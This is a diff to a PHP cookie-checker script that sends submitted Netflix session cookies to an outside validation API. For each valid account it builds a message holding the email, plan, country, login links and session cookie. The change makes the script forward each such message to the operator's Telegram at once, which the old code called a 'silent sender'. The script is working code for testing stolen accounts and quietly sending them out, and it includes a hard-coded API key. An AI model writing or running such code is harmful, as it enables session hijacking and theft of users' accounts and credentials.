@@ -55,73 +55,72 @@ function sendToTelegram($text) {
 
 //ORIGINAL
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+
     $raw_post_data = file_get_contents('php://input');
     $json_data = json_decode($raw_post_data, true);
 
-    if (isset($json_data['cookie'])) {
-        
-        $my_api_key = "NFK_54f66114f943657824650902"; 
-        
+    if (!isset($json_data['cookie'])) {
+        http_response_code(400);
+        echo json_encode(["error" => "No cookie provided"]);
+        exit;
+    }
 
-        $api_url = "https://nftoken.site/v1/api.php";
+    $my_api_key = "NFK_54f66114f943657824650902";
+    $api_url = "https://nftoken.site/v1/api.php";
 
+    $payload = json_encode([
+        'key' => $my_api_key,
+        'cookie' => $json_data['cookie']
+    ]);
 
-        $payload = json_encode([
-            'key' => $my_api_key,
-            'cookie' => $json_data['cookie']
-        ]);
+    $ch = curl_init($api_url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $payload,
+        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 20
+    ]);
 
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
 
-        $ch = curl_init($api_url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+    if (!$response) {
+        http_response_code(500);
+        echo json_encode(["error" => "API failed"]);
+        exit;
+    }
 
-        $response = curl_exec($ch);
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-
-        // 🔥 INIT BULK STORAGE
-        static $bulkResults = [];
-
-        // 🔥 TELEGRAM SILENT SENDER
-        if (!empty($response)) {
-
-        // Decode API response
     $decoded = json_decode($response, true);
 
+    // ✅ ONLY process success
     if (isset($decoded['status']) && $decoded['status'] === 'SUCCESS') {
-        $netflixId = extractNetflixId($json_data['cookie']);
-$msg =
-"🎯 VALID ACCOUNT\n\n" .
 
+        $netflixId = extractNetflixId($json_data['cookie']);
+
+        $msg =
+"🎯 VALID ACCOUNT\n\n" .
 "📧 Email: {$decoded['x_mail']}\n" .
 "📋 Plan: {$decoded['x_tier']}\n" .
 "🌍 Country: {$decoded['x_loc']}\n" .
 "👤 Profile: {$decoded['x_usr']}\n\n" .
-
-"🔗 ACCESS LINKS\n" .
 "💻 PC: {$decoded['x_l1']}\n" .
 "📱 Mobile: {$decoded['x_l2']}\n" .
 "📺 TV: {$decoded['x_l3']}\n\n" .
-
 "🍪 NetflixId={$netflixId}\n" .
 "━━━━━━━━━━━━━━━━━━━━";
 
-        // 🔥 SEND SILENTLY
-     if ($decoded['status'] === 'SUCCESS') {
-    $bulkResults[] = $msg;
-  }
-}
-        
-        http_response_code($http_code);
-        header('Content-Type: application/json');
-        echo $response;
-        exit;
+        // 🔥 FIX: send immediately (no bulk bug)
+        sendToTelegram($msg);
     }
+
+    http_response_code($http_code);
+    header('Content-Type: application/json');
+    echo $response;
+    exit;
+ }
 }
 ?>
 <!DOCTYPE html>
